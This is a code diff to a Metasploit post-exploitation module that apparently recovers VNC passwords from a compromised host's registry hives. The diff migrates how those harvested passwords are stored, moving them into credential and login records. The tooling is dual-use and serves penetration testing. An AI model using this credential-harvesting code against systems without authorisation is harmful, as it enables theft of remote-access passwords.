@@ -8,7 +8,7 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
-
+require 'rex/proto/rfb'
 
 class Metasploit3 < Msf::Post
 
@@ -224,37 +224,79 @@ class Metasploit3 < Msf::Post
           e[:port] = 5900
         end
         print_good("#{e[:name]} => #{e[:hash]} => #{e[:pass]} on port: #{e[:port]}")
-        if session.db_record
-          source_id = session.db_record.id
-        else
-          source_id = nil
-        end
-        report_auth_info(
-          :host  => session.sock.peerhost,
-          :sname => 'vnc',
-          :pass  => "#{e[:pass]}",
-          :port => "#{e[:port]}",
-          :source_id => source_id,
-          :source_type => "exploit",
-          :type => 'password'
-        )
+
+        service_data = {
+            address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+            port: e[:port],
+            service_name: 'vnc',
+            protocol: 'tcp',
+            workspace_id: myworkspace_id
+        }
+
+        # Assemble data about the credential objects we will be creating
+        credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            private_type: :password,
+            private_data: "#{e[:pass]}"
+        }
+
+        # Merge the service data into the credential data
+        credential_data.merge!(service_data)
+
+        # Create the Metasploit::Credential::Core object
+        credential_core = create_credential(credential_data)
+
+        # Assemble the options hash for creating the Metasploit::Credential::Login object
+        login_data ={
+            access_level: 'interactive',
+            core: credential_core,
+            status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        # Merge in the service data and create our Login
+        login_data.merge!(service_data)
+        login = create_credential_login(login_data)
+
       end
       if e[:viewonly_pass] != nil
         print_good("VIEW ONLY: #{e[:name]} => #{e[:viewonly_hash]} => #{e[:viewonly_pass]} on port: #{e[:port]}")
-        if session.db_record
-          source_id = session.db_record.id
-        else
-          source_id = nil
-        end
-        report_auth_info(
-          :host  => session.sock.peerhost,
-          :sname => 'vnc',
-          :viewonly_pass  => "#{e[:viewonly_pass]}",
-          :port => "#{e[:port]}",
-          :source_id => source_id,
-          :source_type => "exploit",
-          :type => 'password_ro'
-        )
+
+        service_data = {
+            address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+            port: e[:port],
+            service_name: 'vnc',
+            protocol: 'tcp',
+            workspace_id: myworkspace_id
+        }
+
+        # Assemble data about the credential objects we will be creating
+        credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            private_type: :password,
+            private_data: "#{e[:viewonly_pass]}"
+        }
+
+        # Merge the service data into the credential data
+        credential_data.merge!(service_data)
+
+        # Create the Metasploit::Credential::Core object
+        credential_core = create_credential(credential_data)
+
+        # Assemble the options hash for creating the Metasploit::Credential::Login object
+        login_data ={
+            access_level: 'view_only',
+            core: credential_core,
+            status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        # Merge in the service data and create our Login
+        login_data.merge!(service_data)
+        login = create_credential_login(login_data)
+
       end
     }
     unload_our_hives(userhives)
